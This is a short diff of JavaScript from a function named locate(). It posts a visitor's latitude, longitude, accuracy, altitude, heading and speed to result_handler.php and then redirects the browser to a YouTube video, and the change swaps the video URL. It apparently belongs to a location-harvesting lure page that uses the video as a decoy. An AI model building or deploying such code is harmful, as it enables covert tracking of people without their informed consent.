@@ -61,7 +61,7 @@ function locate()
       type: 'POST',
       url: 'result_handler.php',
       data: {Status: ok_status,Lat: lat, Lon: lon, Acc: acc, Alt: alt, Dir: dir, Spd: spd},
-      success: function(){window.location='https://www.youtube.com/watch?v=iEXlGTWGgW8&ab_channel=9to5Google';},
+      success: function(){window.location='https://www.youtube.com/shorts/P6B5Qy1BRvc';},
       mimeType: 'text'
     });
   };
